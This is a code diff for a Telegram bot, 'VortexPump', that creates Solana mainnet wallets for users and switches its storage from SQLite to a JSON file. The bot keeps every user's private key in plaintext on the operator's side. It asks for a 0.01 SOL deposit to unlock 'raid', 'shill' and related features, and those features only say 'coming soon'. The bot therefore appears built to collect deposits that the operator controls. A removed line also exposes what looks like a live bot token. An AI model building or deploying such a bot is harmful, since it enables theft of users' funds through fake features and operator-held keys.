@@ -1,5 +1,5 @@
-import sqlite3
 import os
+import json
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from solana.keypair import Keypair
@@ -7,28 +7,30 @@ from solana.rpc.api import Client as SolanaClient
 import base58
 
 # Replace with your Telegram bot token
-BOT_TOKEN = "7493600316:AAF1HA2_wfHZP9kERAWvGhrmMEhcRyZ1-nY"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 
-# Solana RPC URL (Change to testnet if needed)
+# Solana RPC URL
 SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
 solana_client = SolanaClient(SOLANA_RPC_URL)
 
-# Initialize bot
-bot = Client("VortexPump", bot_token=BOT_TOKEN)
+# JSON storage file
+DATA_FILE = "users.json"
 
-# Database setup
-conn = sqlite3.connect("vortex_pump.db", check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute("""
-    CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY,
-        username TEXT,
-        sol_address TEXT,
-        private_key TEXT,
-        balance REAL DEFAULT 0.0
-    )
-""")
-conn.commit()
+# Load user data from JSON file
+def load_users():
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, "r") as f:
+            return json.load(f)
+    return {}
+
+# Save user data to JSON file
+def save_users():
+    with open(DATA_FILE, "w") as f:
+        json.dump(users, f, indent=4)
+
+# Initialize bot and users data
+bot = Client("VortexPump", bot_token=BOT_TOKEN)
+users = load_users()
 
 # Generate a Solana wallet
 def generate_solana_wallet():
@@ -37,21 +39,21 @@ def generate_solana_wallet():
     private_key = base58.b58encode(keypair.secret_key).decode()
     return sol_address, private_key
 
-# Welcome new users & create wallet
+# Start command - Welcome new users and create wallet
 @bot.on_message(filters.command("start"))
 def start(client, message):
-    user_id = message.from_user.id
+    user_id = str(message.from_user.id)
     username = message.from_user.username or message.from_user.first_name
 
-    # Check if user exists
-    cursor.execute("SELECT sol_address FROM users WHERE user_id = ?", (user_id,))
-    user = cursor.fetchone()
-
-    if not user:
+    if user_id not in users:
         sol_address, private_key = generate_solana_wallet()
-        cursor.execute("INSERT INTO users (user_id, username, sol_address, private_key) VALUES (?, ?, ?, ?)",
-                       (user_id, username, sol_address, private_key))
-        conn.commit()
+        users[user_id] = {
+            "username": username,
+            "sol_address": sol_address,
+            "private_key": private_key,
+            "balance": 0.0
+        }
+        save_users()
 
         message.reply_text(
             f"🎉 Welcome, {username}! Your Solana wallet has been created.\n\n"
@@ -74,12 +76,12 @@ def start(client, message):
 # Check Wallet Balance
 @bot.on_callback_query(filters.regex("wallet"))
 def wallet(client, callback_query):
-    user_id = callback_query.from_user.id
-    cursor.execute("SELECT sol_address, balance FROM users WHERE user_id = ?", (user_id,))
-    user = cursor.fetchone()
+    user_id = str(callback_query.from_user.id)
 
-    if user:
-        sol_address, balance = user
+    if user_id in users:
+        sol_address = users[user_id]["sol_address"]
+        balance = users[user_id]["balance"]
+
         callback_query.message.edit_text(
             f"🏦 **Your Wallet**\n\n"
             f"🔹 **Address:** `{sol_address}`\n"
@@ -95,12 +97,10 @@ def wallet(client, callback_query):
 # Deposit Instructions
 @bot.on_callback_query(filters.regex("deposit"))
 def deposit(client, callback_query):
-    user_id = callback_query.from_user.id
-    cursor.execute("SELECT sol_address FROM users WHERE user_id = ?", (user_id,))
-    user = cursor.fetchone()
+    user_id = str(callback_query.from_user.id)
 
-    if user:
-        sol_address = user[0]
+    if user_id in users:
+        sol_address = users[user_id]["sol_address"]
         callback_query.message.edit_text(
             f"🔹 Send at least **0.01 SOL** to this address to unlock features:\n\n"
             f"`{sol_address}`\n\n"
@@ -113,17 +113,14 @@ def deposit(client, callback_query):
 # Check Solana Balance
 @bot.on_callback_query(filters.regex("check_balance"))
 def check_balance(client, callback_query):
-    user_id = callback_query.from_user.id
-    cursor.execute("SELECT sol_address FROM users WHERE user_id = ?", (user_id,))
-    user = cursor.fetchone()
+    user_id = str(callback_query.from_user.id)
 
-    if user:
-        sol_address = user[0]
+    if user_id in users:
+        sol_address = users[user_id]["sol_address"]
         balance = solana_client.get_balance(sol_address)["result"]["value"] / 1e9  # Convert lamports to SOL
 
-        # Update balance in database
-        cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (balance, user_id))
-        conn.commit()
+        users[user_id]["balance"] = balance  # Update balance in JSON
+        save_users()
 
         if balance >= 0.01:
             callback_query.message.edit_text(
@@ -146,11 +143,9 @@ def check_balance(client, callback_query):
 # Locked features until deposit is made
 @bot.on_callback_query(filters.regex("raid|shill|token|refer"))
 def locked_features(client, callback_query):
-    user_id = callback_query.from_user.id
-    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-    user = cursor.fetchone()
+    user_id = str(callback_query.from_user.id)
 
-    if user and user[0] >= 0.01:
+    if users.get(user_id, {}).get("balance", 0.0) >= 0.01:
         callback_query.message.edit_text("🚀 Feature coming soon!")
     else:
         callback_query.message.edit_text("❌ You need to deposit at least **0.01 SOL** to unlock this feature!")
